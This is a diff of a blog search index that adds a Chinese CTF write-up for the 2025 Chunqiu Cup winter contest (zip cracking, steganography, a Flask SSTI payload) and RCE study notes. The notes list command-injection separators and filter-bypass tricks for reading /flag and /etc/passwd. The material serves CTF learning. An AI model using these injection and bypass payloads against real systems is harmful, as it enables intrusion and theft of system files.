@@ -163,11 +163,336 @@ plt.show()</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>文件包含</title>
-    <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[]]></content>
+    <title>2025春秋杯冬季赛</title>
+    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单算术："><a href="#简单算术：" class="headerlink" title="简单算术："></a>简单算术：</h2><p>根据提示，想想异或，直接尝试Cyberchef一把梭</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
+<h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>附件给了一个压缩包和一张阿兹特克码</p>
+<p>解析得到</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
+<p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
+<p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
+<p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p>
+<h2 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h2><p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
+<p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p>
+<pre><code class="highlight python"><span class="keyword">import</span> zipfile
+<span class="keyword">import</span> re
+zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
+<span class="keyword">while</span> <span class="literal">True</span>:
+    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
+        ts1 = zipfile.ZipFile(zipname)
+        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
+        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
+        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
+    <span class="keyword">else</span>:
+        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>
+
+<p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p>
+<pre><code class="highlight python"><span class="keyword">import</span> zipfile
+<span class="keyword">import</span> os
+<span class="keyword">import</span> base64
+
+<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
+    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
+        encoded_password = f.read().strip()
+    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
+    <span class="keyword">return</span> decoded_password
+<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
+    <span class="keyword">try</span>:
+        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
+            zf.extractall(path=extract_to, pwd=password.encode())
+            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
+            <span class="keyword">return</span> zf.namelist()  
+    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
+        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)
+        <span class="keyword">return</span> []
+<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
+    current_number = start_number
+    <span class="keyword">while</span> <span class="literal">True</span>:
+        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
+        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
+        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
+            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
+            <span class="keyword">break</span>
+        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
+            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
+            <span class="keyword">break</span>
+        password = decode_password(password_filename)
+        extracted_files = extract_zip(zip_filename, password,parent_dir)
+        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
+            <span class="keyword">break</span>
+        next_zip_file = <span class="literal">None</span>
+        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
+            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
+                next_zip_file = extracted_file
+                <span class="keyword">break</span>
+        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
+            <span class="keyword">break</span>
+        current_number -= <span class="number">1</span>
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    recursive_extract()</code></pre>
+
+<p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
+<p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p>
+<p>根据我们第一个密码FG…..，显然不是文件头的格式，那么从0开始到99提取文件内容</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">import</span> base64
+
+
+<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
+    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
+        encoded_password = f.read().strip()
+    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
+    <span class="keyword">return</span> decoded_password
+
+<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
+    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
+        current_number = start_number
+        <span class="keyword">while</span> <span class="literal">True</span>:
+            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
+            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
+                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
+                <span class="keyword">break</span>
+            decoded_password = decode_password(password_filename)
+            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
+            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)
+            current_number += <span class="number">1</span>
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>
+
+<p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p>
+<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>首先看提示是不知道有什么用的</p>
+<p>拿到一张png，用010查一下看到zip头</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
+<p>foremost提取一下</p>
+<p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p>
+<p>同时注意到文件名有点可疑，留意一下，可能后续要用</p>
+<p>脚本：</p>
+<pre><code class="highlight plaintext">import os
+import zipfile
+import tarfile
+import py7zr
+import shutil
+
+
+def extract_zip(zip_path, extract_dir):
+    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;
+    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
+        zip_ref.extractall(extract_dir)
+        return zip_ref.namelist()  # 返回解压出来的文件列表
+
+
+def extract_tar(tar_path, extract_dir):
+    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;
+    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
+        tar_ref.extractall(extract_dir)
+        return tar_ref.getnames()  # 返回解压出来的文件列表
+
+
+def extract_7z(archive_path, extract_dir):
+    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;
+    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
+        archive_ref.extractall(extract_dir)
+        return archive_ref.getnames()  # 返回解压出来的文件列表
+
+
+def handle_compressed_file(file_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;
+    if file_path.endswith(&#x27;.zip&#x27;):
+        extracted_files = extract_zip(file_path, extract_dir)
+    elif file_path.endswith(&#x27;.tar&#x27;):
+        extracted_files = extract_tar(file_path, extract_dir)
+    elif file_path.endswith(&#x27;.7z&#x27;):
+        extracted_files = extract_7z(file_path, extract_dir)
+    else:
+        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)
+        return []
+
+    # 记录去掉后缀并连接的文件名
+    with open(output_txt, &#x27;a&#x27;) as output_file:
+        for file_name in extracted_files:
+            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀
+            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)
+
+    return extracted_files
+
+
+def process_zip(zip_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;
+    # 解压当前zip文件并返回解压后的文件列表
+    extracted_files = extract_zip(zip_path, extract_dir)
+
+    for extracted_file in extracted_files:
+        extracted_file_path = os.path.join(extract_dir, extracted_file)
+
+        if os.path.isdir(extracted_file_path):
+            continue  # 跳过目录
+
+        # 如果解压出来的是压缩包，再进行递归处理
+        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
+            # 解压嵌套压缩包并处理
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+            # 如果是嵌套的压缩包，再递归调用
+            if extracted_file.endswith(&#x27;.zip&#x27;):
+                process_zip(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.tar&#x27;):
+                process_tar(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.7z&#x27;):
+                process_7z(extracted_file_path, extract_dir, output_txt)
+
+        else:
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+
+    # 删除当前处理的压缩包
+    if zip_path.endswith(&#x27;.zip&#x27;):
+        os.remove(zip_path)
+
+
+def process_tar(tar_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;
+    extracted_files = extract_tar(tar_path, extract_dir)
+    for extracted_file in extracted_files:
+        extracted_file_path = os.path.join(extract_dir, extracted_file)
+
+        if os.path.isdir(extracted_file_path):
+            continue
+
+        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+            if extracted_file.endswith(&#x27;.zip&#x27;):
+                process_zip(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.tar&#x27;):
+                process_tar(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.7z&#x27;):
+                process_7z(extracted_file_path, extract_dir, output_txt)
+
+    # 删除当前处理的压缩包
+    if tar_path.endswith(&#x27;.tar&#x27;):
+        os.remove(tar_path)
+
+
+def process_7z(archive_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;
+    extracted_files = extract_7z(archive_path, extract_dir)
+    for extracted_file in extracted_files:
+        extracted_file_path = os.path.join(extract_dir, extracted_file)
+
+        if os.path.isdir(extracted_file_path):
+            continue
+
+        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+            if extracted_file.endswith(&#x27;.zip&#x27;):
+                process_zip(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.tar&#x27;):
+                process_tar(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.7z&#x27;):
+                process_7z(extracted_file_path, extract_dir, output_txt)
+
+    # 删除当前处理的压缩包
+    if archive_path.endswith(&#x27;.7z&#x27;):
+        os.remove(archive_path)
+
+
+def main():
+    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
+    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
+    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
+
+    if not os.path.exists(extract_dir):
+        os.makedirs(extract_dir)
+
+    # 开始处理压缩包
+    with open(output_txt, &#x27;w&#x27;) as output_file:
+        output_file.write(&quot;&quot;)
+    process_zip(zip_path, extract_dir, output_txt)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+
+<p>再对提出来的文件名做两种处理</p>
+<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
+    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;
+    with open(input_txt, &#x27;r&#x27;) as infile:
+        file_names = infile.readlines()
+
+    # 去掉换行符并从后往前连接
+    reversed_file_names = [name.strip() for name in reversed(file_names)]
+
+    # 将连接后的文件名写入新文件
+    with open(output_txt, &#x27;w&#x27;) as outfile:
+        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)
+        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名
+def remove_newlines_and_connect(input_txt, output_txt):
+    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;
+    with open(input_txt, &#x27;r&#x27;) as infile:
+        # 读取所有行并去掉换行符
+        file_names = infile.read().splitlines()
+
+    # 将文件名用空格连接
+    connected_file_names = &quot;&quot;.join(file_names)
+
+    # 将连接后的文件名写入新文件
+    with open(output_txt, &#x27;w&#x27;) as outfile:
+        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)
+        outfile.write(connected_file_names)  # 直接写入连接后的字符串
+
+def main():
+    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
+    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
+    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
+    reverse_file_names(input_txt, output1_txt)
+    remove_newlines_and_connect(input_txt, output2_txt)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+
+<p>根据提示BASE58-Ripple、SM4-ECB</p>
+<p>先后尝试顺序的和逆序的</p>
+<p>最后逆序的得到以下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
+<p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p>
+<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
+<p>在谷歌搜图后判断出是 DataMatrix码</p>
+<p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
+<h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>解压得到一个wav文件</p>
+<p>根据提示deepsound和弱口令</p>
+<p>试一下123？</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
+<p>运气比较好直接出来了</p>
+<p>提取zip后发现需要密码打开</p>
+<p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
+<p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p>
+<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
+bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
+
+<p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p>
+<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>
+
+<p>得到flag.png</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
+<p>左上角一看肯定有lsb稳了，zsteg一跑</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据提示想想flask,应该是SSTI漏洞</p>
+<p>先试着打一下，看看有没有绕过</p>
+<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
+<p>直接爆了，那就ls换cat flag解决</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
+]]></content>
       <tags>
-        <tag>CTF Web</tag>
+        <tag>-CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -283,6 +608,212 @@ plt.show()</code></pre>
       </categories>
       <tags>
         <tag>智能合约</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[]]></content>
+      <tags>
+        <tag>CTF Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE</title>
+    <url>/2025/01/21/RCE/</url>
+    <content><![CDATA[<h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
+<p><strong>原理</strong></p>
+<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
+<p><strong>系统命令执行函数</strong></p>
+<pre><code class="highlight plaintext">*** system() 语法为system(string $command, int &amp;$return var = ?)
+*** passthru() system()的平替，写个命令就会执行命令，自己能回显
+*** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显
+*** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果
+*** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容
+*** proc_open() 语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)
+$command是要执行的命令。
+$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。
+$pipes是一个引用变量，用于存储与进程相关的管道。
+$cwd（可选）是设置子进程的当前工作目录。
+$env（可选）是设置子进程的环境变量。
+$other_options（可选）是其他选项，如设置超时等
+不能直接回显
+*** pcntl_exec()  语法格式为pcntl exec(string $path, array $args = ?, array $envs = ?)
+path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。
+envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</code></pre>
+
+<p>那么如果遇到类似PING的执行漏洞，如何将前面的字段和系统命令无缝衔接呢？</p>
+<p>那么就需要管道符来支持：</p>
+<p>*<strong>关于管道符</strong></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p>
+<p><strong>For Windows：</strong></p>
+<p>“|” : 直接执行后面的语句。例如：<code>ping 127.0.0.1| whoami</code><br>“||” : 如果前面执行的语句执行出错，则执行后面的语句，否则只执行前面的语句。例如： <code>ping 1234.1 || whoami</code><br>“&amp;” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： <code>ping 127.0.0.1 &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
+<p><strong>For Linux:</strong></p>
+<p>“;” : 执行完前面的语句再执行后面的。 例如： <code>ping 127.0.0.1 ; whoami</code><br>“|” : 显示后面语句的执行结果。列如：<code>ping 127.0.0.1 | whoami</code><br>“||” : 当前的语句执行出错时，执行后面的语句。 例如： <code>ping 1472.1 || whoami</code><br>“&amp;” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：<code>ping 127.0.0.1 | &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
+<p>发现漏洞后，如何得到控制权呢？</p>
+<p>最简单的漏洞就是找到注入点直接注</p>
+<p>但是难免会碰到存在黑名单的情况，这个时候就需要绕过出场了</p>
+<h2 id="空格过滤绕过："><a href="#空格过滤绕过：" class="headerlink" title="空格过滤绕过："></a>空格过滤绕过：</h2><h3 id="大括号-："><a href="#大括号-：" class="headerlink" title="大括号{}："></a>大括号{}：</h3><pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre>
+
+<h3 id="IFS代替空格："><a href="#IFS代替空格：" class="headerlink" title="$IFS代替空格："></a><code>$IFS</code>代替空格：</h3><p><code>$IFS$9</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS</code>这三个都行</p>
+<p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。</p>
+<pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre>
+
+<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p>
+<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre>
+
+<p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
+<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre>
+
+<h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;，&lt;&gt;"></a>重定向字符&lt;，&lt;&gt;</h3><p>(具体哪种情景能用还不太清楚)</p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>%20绕过(相当于url编码的空格)</p>
+<p>%09绕过（相当于Tab键）</p>
+<p>%0a–代表换行符</p>
+<p>%0b–用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p>
+<p>%0d–回车换行</p>
+<p>%a0–代表的是非断行空格</p>
+<p>%00–%00代表的是ASCII码中的空字符</p>
+<p>可以将空格字符替换成注释&#x2F;**&#x2F;，也可以使用内联注释<code>/!code/</code>        </p>
+<p>内联注释绕过知识点</p>
+<pre><code>    当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 /*!  */中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行
+</code></pre>
+<h2 id="文件名过滤绕过："><a href="#文件名过滤绕过：" class="headerlink" title="文件名过滤绕过："></a>文件名过滤绕过：</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="??,*绕过"></a>??,*绕过</h3><p><code>passthru</code>代替<code>system</code>，过滤flag文件名用?，*绕过</p>
+<pre><code class="highlight plaintext">cat /fl??
+
+cat /f*  #多个匹配结果同时展现</code></pre>
+
+<p>以上指令等效于<code>cat /flag</code></p>
+<h3 id="单引号-‘-双引号-“”-反引号-绕过正则"><a href="#单引号-‘-双引号-“”-反引号-绕过正则" class="headerlink" title="单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则"></a>单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</h3><pre><code class="highlight plaintext">cat /fl&quot;&quot;ag
+
+c&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre>
+
+<p>对<code>php</code>来说这是<code>fl&quot;&quot;ag</code>而不是<code>flag</code>关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p>
+<pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre>
+
+<h3 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h3><p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
+<pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre>
+
+<h3 id="特殊变量：-1到-9、-和"><a href="#特殊变量：-1到-9、-和" class="headerlink" title="特殊变量：$1到$9、$@和$*"></a>特殊变量：$1到$9、$@和$*</h3><p>这些特殊变量输出为空</p>
+<pre><code class="highlight plaintext">cat /fl$9ag
+
+cat /fl$@ag</code></pre>
+
+<p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p>
+<pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swd
+
+cat$x /etc$x/passwd$x
+
+ca$@t /etc$x/passwd$x</code></pre>
+
+<h3 id="内联执行绕过（通过赋值绕过）"><a href="#内联执行绕过（通过赋值绕过）" class="headerlink" title="内联执行绕过（通过赋值绕过）"></a>内联执行绕过（通过赋值绕过）</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p>
